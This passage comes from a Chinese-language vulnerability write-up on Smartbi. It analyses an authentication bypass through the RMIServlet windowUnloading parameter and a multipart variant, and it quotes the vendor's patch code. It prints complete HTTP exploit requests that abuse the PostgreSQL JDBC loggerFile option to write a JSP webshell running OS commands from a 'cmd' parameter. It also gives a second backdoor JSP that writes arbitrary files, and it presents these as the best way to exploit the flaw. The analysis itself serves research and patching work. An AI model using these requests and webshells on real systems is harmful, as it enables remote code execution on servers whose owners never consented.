src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829150934217.png" alt="image-20230829150934217"></p><p>接下来，向login路径，发送获取到的token值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829151704985.png" alt="image-20230829151704985"></p><p>将返回的Cookie获取下来，带着访问，即可绕过登录。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829151908784.png" alt="image-20230829151908784"></p><h2 id="2-x2F-vision-x2F-RMIServlet-windowUnloading参数，逻辑漏洞"><a href="#2-x2F-vision-x2F-RMIServlet-windowUnloading参数，逻辑漏洞" class="headerlink" title="2. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，逻辑漏洞"></a>2. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，逻辑漏洞</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>首先还是给出POC：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1</span><br><span class="line">Host: localhost:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQConfigLogined=; JSESSIONID=AA35FAB6507174C68D84297771E71345; Phpstorm-4588ec75=9665af70-58e7-4baf-8fce-3fbfb54208c8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">className=&amp;methodName=&amp;params=[]</span><br></pre></td></tr></table></figure><p>当发送了以上请求包后，能够从返回包中获取如下内容：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829152543109.png" alt="image-20230829152543109"></p><p>即可证明漏洞存在。</p><p>该漏洞的主要成因，是在于开发者在处理用户对<code>/vision/RMIServlet</code>这条路径的访问逻辑的时候，出现了逻辑错误。</p><p>接下来开始分析。</p><p>当用户访问<code>/vision/RMIServlet</code>这条路径的时候，会首先经过<code>smartbi.freequery.filter.CheckIsLoggedFilter.class</code>类，通过其中的<code>doFilter()</code>函数进行一个过滤。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829173243088.png" alt="image-20230829173243088"></p><p>这个函数的主要目的是，以正确的方式获取请求中传入的三个参数，分别是类名(className)，方法名(methodName)，参数(params)。</p><p>在这个函数里，开发者一共提供了三种方式来获取分别是：</p><p>1、当请求的路径中参数以windowUnloading开头时，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829173928513.png" alt="image-20230829173928513"></p><p>则通过url解码，然后调用一个解密函数来获取三个值。</p><p>2、如果不是以windowUnloading开头，则从请求体流中获取三个值：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829174254675.png" alt="image-20230829174254675"></p><p>3、如果不是上述两种情况，则从请求中获取三个值：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829174643659.png" alt="image-20230829174643659"></p><p>当获取了三个值后，通过解密函数<code>RMICoder.decode()</code>，随后将其赋值给<code>className</code>,<code>methodName</code>,<code>params</code>这三个变量：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829175606879.png" alt="image-20230829175606879"></p><p>随后一路正常跟进，来到这里的判定：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829175954929.png" alt="image-20230829175954929"></p><p>在这个<code>FilterUtil.needToCheck()</code>函数中，会检查一个包含类名和方法名的白名单，当满足白名单，即可返回false，继续下一部分判断：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829180213984.png" alt="image-20230829180213984"></p><p>这里我们通过<code>windowUnloading</code>参数传入的类是<code>UserService</code>类，方法是<code>checkVersion()</code>方法，在白名单中。</p><p>因此直接过了这部分的检测，继续下一部分的程序。</p><p>跟进到<code>smartbi.framework.rmi.RMIServlet.class</code>类中，因为我们使用的POST方式传参数，因此此时调用到<code>doPost()</code>方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829180924726.png" alt="image-20230829180924726"></p><p>在红框这部分的代码中，可以发现出现了一个很大的逻辑问题，这里的<code>rmiInfo</code>变量原本应该是我们通过windowUnloading参数传入的类名，方法名和参数值，但是这里通过<code>RMIUtil.parseRMIInfo()</code>函数，通过POST中的参数，重新给三个值赋了一次值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829184051597.png" alt="image-20230829184051597"></p><p>这里是我随便传入的几个值。</p><p>随后，程序会步入到processExecute()函数中，这里看一下调用链：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829184627616.png" alt="image-20230829184627616"></p><p>可以发现，这里最后调用的<code>this.e</code>实际上是一个HashMap的名单，也就是在<code>this.e</code>中，查找上述获取的<code>className</code>是否存在。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829184931083.png" alt="image-20230829184931083"></p><p>只要获取到的className存在于<code>this.e</code>中，就可以继续接下来的程序。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829185144923.png" alt="image-20230829185144923"></p><p>使用将params以json格式进行解析，随后调用service.execute()方式，这里最后将会通过反射方式调用我们给出的类中的方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829185421065.png" alt="image-20230829185421065"></p><h4 id="基于Smartbi中DataSourceService类的JDBC任意文件写入："><a href="#基于Smartbi中DataSourceService类的JDBC任意文件写入：" class="headerlink" title="基于Smartbi中DataSourceService类的JDBC任意文件写入："></a>基于Smartbi中DataSourceService类的JDBC任意文件写入：</h4><p>通过上述分析，我们可以知道，当使用windowUnloading进行绕过之后，我们实际上是可以调用<code>this.e</code>这个<code>hashmap</code>中的任意类的任意方法，同时传递任意参数的。</p><p>这里我首先给出可以使用的EXP，随后根据exp来对该漏洞的利用方式进行分析，其中会包含一些坑点，以及问题。</p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1</span><br><span class="line">Host: localhost:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQConfigLogined=; JSESSIONID=9F4B22AFDE785C86FB33687608795655; Phpstorm-4588ec75=9665af70-58e7-4baf-8fce-3fbfb54208c8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2525</span><br><span class="line"></span><br><span class="line">className=DataSourceService&amp;methodName=testConnectionList&amp;params=%5b%5b%7b%22%70%61%73%73%77%6f%72%64%22%3a%22%22%2c%22%6d%61%78%43%6f%6e%6e%65%63%74%69%6f%6e%22%3a%31%30%30%2c%22%75%73%65%72%22%3a%22%22%2c%22%64%72%69%76%65%72%54%79%70%65%22%3a%22%50%4f%53%54%47%52%45%53%51%4c%22%2c%22%76%61%6c%69%64%61%74%69%6f%6e%51%75%65%72%79%22%3a%22%53%45%4c%45%43%54%20%31%22%2c%22%75%72%6c%22%3a%22%6a%64%62%63%3a%70%6f%73%74%67%72%65%73%71%6c%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%35%34%33%32%2f%74%65%73%74%3f%41%70%70%6c%69%63%61%74%69%6f%6e%4e%61%6d%65%3d%78%78%78%75%73%65%72%3d%74%65%73%74%26%70%61%73%73%77%6f%72%64%3d%74%65%73%74%26%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%44%45%42%55%47%26%6c%6f%67%67%65%72%46%69%6c%65%3d%2e%2e%2f%77%65%62%61%70%70%73%2f%73%6d%61%72%74%62%69%2f%76%69%73%69%6f%6e%2f%63%6d%64%73%68%65%6c%6c%2e%6a%73%70%26%3c%25%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%5c%22%7e%7e%7e%5c%22%29%3b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%2e%74%6f%42%79%74%65%41%72%72%61%79%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%63%6d%64%5c%22%29%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%29%3b%25%3e%22%2c%22%6e%61%6d%65%22%3a%22%74%65%73%74%22%2c%22%64%72%69%76%65%72%22%3a%22%6f%72%67%2e%70%6f%73%74%67%72%65%73%71%6c%2e%44%72%69%76%65%72%22%2c%22%69%64%22%3a%22%22%2c%22%64%65%73%63%22%3a%22%22%2c%22%61%6c%69%61%73%22%3a%22%22%2c%22%64%62%43%68%61%72%73%65%74%22%3a%22%22%2c%22%69%64%65%6e%74%69%66%69%65%72%51%75%6f%74%65%53%74%72%69%6e%67%22%3a%22%5c%22%22%2c%22%74%72%61%6e%73%61%63%74%69%6f%6e%49%73%6f%6c%61%74%69%6f%6e%22%3a%2d%31%2c%22%76%61%6c%69%64%61%74%69%6f%6e%51%75%65%72%79%4d%65%74%68%6f%64%22%3a%30%2c%22%64%62%54%6f%43%68%61%72%73%65%74%22%3a%22%22%2c%22%61%75%74%68%65%6e%74%69%63%61%74%69%6f%6e%54%79%70%65%22%3a%22%53%54%41%54%49%43%22%2c%22%64%72%69%76%65%72%43%61%74%61%6c%6f%67%22%3a%6e%75%6c%6c%2c%22%65%78%74%65%6e%64%50%72%6f%70%22%3a%22%7b%5c%22%6d%61%78%57%61%69%74%43%6f%6e%6e%65%63%74%69%6f%6e%54%69%6d%65%5c%22%3a%2d%31%2c%5c%22%61%6c%6c%6f%77%45%78%63%65%6c%49%6d%70%6f%72%74%5c%22%3a%66%61%6c%73%65%2c%5c%22%61%70%70%6c%79%54%6f%53%6d%61%72%74%62%69%78%44%61%74%61%73%65%74%5c%22%3a%66%61%6c%73%65%2c%5c%22%63%61%74%61%6c%6f%67%54%79%70%65%5c%22%3a%5c%22%50%72%6f%64%75%63%74%42%75%69%6c%74%49%6e%5c%22%7d%22%7d%5d%5d</span><br></pre></td></tr></table></figure><p>接下来根据exp进行分析：</p><p>首先，这里的文件写入，主要是利用的jdbc存在一个可以在url中指定日志文件的特性。</p><p>不难看出，我们此时调用的是<code>DataSourceService</code>类中的<code>testConnectionList()</code>方法，同时，将我们传入的参数进行url解码后，可以得到如下结果。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[&#123;&quot;password&quot;:&quot;&quot;,&quot;maxConnection&quot;:100,&quot;user&quot;:&quot;&quot;,&quot;driverType&quot;:&quot;POSTGRESQL&quot;,&quot;validationQuery&quot;:&quot;SELECT 1&quot;,&quot;url&quot;:&quot;jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&amp;password=test&amp;loggerLevel=DEBUG&amp;loggerFile=../webapps/smartbi/vision/cmdshell.jsp&amp;&lt;%out.println(\&quot;~~~\&quot;);out.println(new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream())));%&gt;&quot;,&quot;name&quot;:&quot;test&quot;,&quot;driver&quot;:&quot;org.postgresql.Driver&quot;,&quot;id&quot;:&quot;&quot;,&quot;desc&quot;:&quot;&quot;,&quot;alias&quot;:&quot;&quot;,&quot;dbCharset&quot;:&quot;&quot;,&quot;identifierQuoteString&quot;:&quot;\&quot;&quot;,&quot;transactionIsolation&quot;:-1,&quot;validationQueryMethod&quot;:0,&quot;dbToCharset&quot;:&quot;&quot;,&quot;authenticationType&quot;:&quot;STATIC&quot;,&quot;driverCatalog&quot;:null,&quot;extendProp&quot;:&quot;&#123;\&quot;maxWaitConnectionTime\&quot;:-1,\&quot;allowExcelImport\&quot;:false,\&quot;applyToSmartbixDataset\&quot;:false,\&quot;catalogType\&quot;:\&quot;ProductBuiltIn\&quot;&#125;&quot;&#125;]]</span><br></pre></td></tr></table></figure><p>这里关键的漏洞利用部分就是url对应的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;url&quot;:&quot;jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&amp;password=test&amp;loggerLevel=DEBUG&amp;loggerFile=../webapps/smartbi/vision/cmdshell.jsp&amp;&lt;%out.println(\&quot;~~~\&quot;);out.println(new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream())));%&gt;&quot;</span><br></pre></td></tr></table></figure><p>开始跟一下调用链：</p><p>这里找到入口<code>testConnectionList()</code>函数,并给出一个调用栈。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901110449911.png" alt="image-20230901110449911"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901110400994.png" alt="image-20230901110400994"></p><p>这里最关键的写文件函数在<code>org.postgresql.Driver.class#connect()</code>中，这里让我们详细分析一下写文件的原理：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901111035014.png" alt="image-20230901111035014"></p><p>整个函数中，最关键的函数是这三个</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901111124967.png" alt="image-20230901111124967"></p><h4 id="parseURL-函数："><a href="#parseURL-函数：" class="headerlink" title="parseURL()函数："></a>parseURL()函数：</h4><p>该函数会对我们传入的url进行解析，以获取其中的参数。具体的解析参数的逻辑如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901113106858.png" alt="image-20230901113106858"></p><p><code>parseURL()</code>函数会以&amp;作为分割，将url中的参数分割为数个字符串。</p><p>随后，依次遍历所有被分割出来的字符串，通过<code>pos = token.indexOf(61);</code>检测字符串中是否存在<code>=</code>号。</p><p>当存在<code>=</code>，也就是pos不为-1时，就会以<code>=</code>为标识对字符串做分割，将其作为一个键值对，<strong>对值进行url解码</strong>，随后存入对应的变量中。如果没有等号，就将整个字符串作为键，值设为<code>&quot;&quot;</code>。</p><p><strong>这里的url解码需要注意一下，会涉及到后面的一个坑点</strong>。</p><p>当这段函数循环处理了我们的url之后，可以得到如下的一个数组：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901132818056.png" alt="image-20230901132818056"></p><p>此时可以发现，我们指定的日志文件路径和日志文件名，已经被作为loggerFile键对应的值被解析出来了。</p><h4 id="this-setupLoggerFromProperties-函数："><a href="#this-setupLoggerFromProperties-函数：" class="headerlink" title="this.setupLoggerFromProperties()函数："></a>this.setupLoggerFromProperties()函数：</h4><p>这个函数用于处理日志文件，跟入其中之后，可以看到它对于我们上述参数的处理</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901134036668.png" alt="image-20230901134036668"></p><p>首先在第一个红框中，是在读取loggerLevel，也就是日志文件等级，这里如我们之前设置的一样，是DEBUG，这里不能设置为OFF，否则会失败。</p><p>随后在第二个红框中，可以看到它读取了我们设置的文件路径，因为这里没有做任何文件路径的限制，所以可以通过<code>../</code>从当前路径退出，让我们将文件写入到我们想要的地方。</p><h4 id="LOGGER-log-函数："><a href="#LOGGER-log-函数：" class="headerlink" title="LOGGER.log()函数："></a>LOGGER.log()函数：</h4><p>这个函数的作用很简单，就是将我们传入的url写入到日志文件中，而这个日志文件，也就是我们之前设定好的路径下的cmdShell.jsp文件。</p><p>而这个时候，我们的恶意代码就会作为url的一部分，被嵌入到我们设定好的日志文件中去。</p><p>这里让我们看一下本地生成的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901135354471.png" alt="image-20230901135354471"></p><p>可以看到，这里我们成功的在一大串报错中嵌入成功了一段jsp代码，当我们访问这个文件的时候，即可达成jsp代码的执行，而剩余的报错，只会被以文本的方式进行解读。</p><p>以此，我们即可实现依托于Runtime类的exec命令执行。</p><h3 id="坑点解析：-1"><a href="#坑点解析：-1" class="headerlink" title="坑点解析："></a>坑点解析：</h3><p>虽然我们现在已经可以实现命令执行了，但是只是使用Runtime类进行的最简陋的命令执行效果。</p><p>但当我们尝试使用同样的方法进行更复杂的文件写入，例如希望尝试写入一串哥斯拉的jsp马，或是更复杂的命令执行的时候，我们会遇到一些小小的坑点。</p><p>这里让我们回过头来看我们写入的代码和parseURL()函数中的url解析逻辑：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901140007267.png" alt="image-20230901140007267"></p><p>假设我们想要通过url写入一串同时带有<code>=</code>和<code>%</code>的jsp代码如下：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">ApplicationName=xxxuser=test&amp;hhh=&lt;% <span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>()%&gt;</span><br></pre></td></tr></table></figure><p>此时，我们不难发现，根据parseURL()函数的解析规则，这段URL中的参数会被&amp;分割为两个字符串：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ApplicationName ： xxxuser=test</span><br></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">hhh ： &lt;% <span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>()%&gt;</span><br></pre></td></tr></table></figure><p>随后再对这两个字符串依次进行处理。也就是以等号为分割，将它转换为一个键值对。</p><p>此时，对于第二个字符串来说，键名是hhh，而值则是我们构造的jsp代码。</p><p>这个时候就出现问题了，在之前提过，当进行值的存储的时候，会将值首先进行依次URL解码。此时，程序就会将<code>&lt;% String</code>这里的<code>%</code>误认为是某个url编码的值的标识符，但是它无法进行解析，于是会抛出错误。</p><p>当然，可能会有人希望通过编码的方式来进行绕过，但是这样也是不可行的。</p><p>当我们将上述的jsp程序url编码为以下字符串的时候：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3c%25%20%53%74%72%69%6e%67%20%74%65%73%74%20%3d%20%6e%65%77%20%53%74%72%69%6e%67%28%29%25%3e</span><br></pre></td></tr></table></figure><p>他确实可以进行绕过，但是当我们访问最后的jsp文件的时候会发现，上述的url编码被原样写入到文件中了：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901141650393.png" alt="image-20230901141650393"></p><p>也就导致我们无法正确运行程序。</p><h3 id="正确利用漏洞的方案：-1"><a href="#正确利用漏洞的方案：-1" class="headerlink" title="正确利用漏洞的方案："></a>正确利用漏洞的方案：</h3><p>因此，这里最好的利用方式，还是创建一个可以写入文件的简单的后门马，随后利用这个后门马，在我们想要的地方写入我们需要的纯净的程序。</p><p>例如：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="string">&quot;success&quot;</span>);<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(request.getParameter(<span class="string">&quot;filename&quot;</span>)).write(request.getParameter(<span class="string">&quot;content&quot;</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure><p>又或者是简单的使用命令执行的效果：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="string">&quot;&amp;&amp;&amp;&amp;&quot;</span>);out.println(<span class="keyword">new</span> <span class="title class_">String</span>(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream())));out.println(<span class="string">&quot;&amp;&amp;&amp;&amp;&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><h2 id="3-x2F-vision-x2F-RMIServlet-windowUnloading参数，Multipart逻辑漏洞"><a href="#3-x2F-vision-x2F-RMIServlet-windowUnloading参数，Multipart逻辑漏洞" class="headerlink" title="3. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，Multipart逻辑漏洞"></a>3. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，Multipart逻辑漏洞</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>这里直接给出EXP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1</span><br><span class="line">Host: localhost:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</span><br><span class="line">Content-Length: 1189</span><br><span class="line">Content-Type: multipart/form-data;charset=UTF-8;boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;className&quot;</span><br><span class="line"></span><br><span class="line">DataSourceService</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;methodName&quot;</span><br><span class="line"></span><br><span class="line">testConnectionList</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;params&quot;</span><br><span class="line"></span><br><span class="line">[[&#123;&quot;password&quot;:&quot;&quot;,&quot;maxConnection&quot;:100,&quot;user&quot;:&quot;&quot;,&quot;driverType&quot;:&quot;POSTGRESQL&quot;,&quot;validationQuery&quot;:&quot;SELECT 1&quot;,&quot;url&quot;:&quot;jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&amp;password=test&amp;loggerLevel=DEBUG&amp;loggerFile=../webapps/smartbi/vision/0DFCC1b8f1Db599F.jsp&amp;&lt;%out.println(\&quot;~~~\&quot;);out.println(new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream())));%&gt;&quot;,&quot;name&quot;:&quot;test&quot;,&quot;driver&quot;:&quot;org.postgresql.Driver&quot;,&quot;id&quot;:&quot;&quot;,&quot;desc&quot;:&quot;&quot;,&quot;alias&quot;:&quot;&quot;,&quot;dbCharset&quot;:&quot;&quot;,&quot;identifierQuoteString&quot;:&quot;\&quot;&quot;,&quot;transactionIsolation&quot;:-1,&quot;validationQueryMethod&quot;:0,&quot;dbToCharset&quot;:&quot;&quot;,&quot;authenticationType&quot;:&quot;STATIC&quot;,&quot;driverCatalog&quot;:null,&quot;extendProp&quot;:&quot;&#123;\&quot;maxWaitConnectionTime\&quot;:-1,\&quot;allowExcelImport\&quot;:false,\&quot;applyToSmartbixDataset\&quot;:false,\&quot;catalogType\&quot;:\&quot;ProductBuiltIn\&quot;&#125;&quot;&#125;]]</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br></pre></td></tr></table></figure><p>在上面的windowUnloading参数绕过漏洞出现之后，官方随即通过补丁进行了修复：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">patch</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.assertQueryString(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">assertQueryString</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getQueryString();</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isNullOrEmpty(query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading=&amp;&quot;</span>) &amp;&amp; !query.startsWith(<span class="string">&quot;windowUnloading&amp;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">paramClassName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">paramMethodName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">windowUnloadingStr</span> <span class="operator">=</span> query.length() &gt; <span class="string">&quot;windowUnloading&quot;</span>.length() &amp;&amp; query.charAt(<span class="string">&quot;windowUnloading&quot;</span>.length()) == <span class="string">&#x27;=&#x27;</span> ? <span class="string">&quot;windowUnloading=&amp;&quot;</span> : <span class="string">&quot;windowUnloading&amp;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (query.length() &gt; windowUnloadingStr.length()) &#123;</span><br><span class="line">                    content = query.substring(windowUnloadingStr.length());</span><br><span class="line">                    <span class="keyword">if</span> (content.endsWith(<span class="string">&quot;=&quot;</span>)) &#123;</span><br><span class="line">                        content = content.substring(<span class="number">0</span>, content.length() - <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    content = URLDecoder.decode(content, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">urlClassName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">urlMethodName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (content.indexOf(<span class="string">&quot;className=&quot;</span>) == -<span class="number">1</span> &amp;&amp; content.indexOf(<span class="string">&quot;methodName=&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                    String[] decode = RMICoder.decode(content);</span><br><span class="line">                    urlClassName = decode[<span class="number">0</span>];</span><br><span class="line">                    urlMethodName = decode[<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Map&lt;String, String&gt; map = HttpUtil.parseQueryString(content);</span><br><span class="line">                    urlClassName = 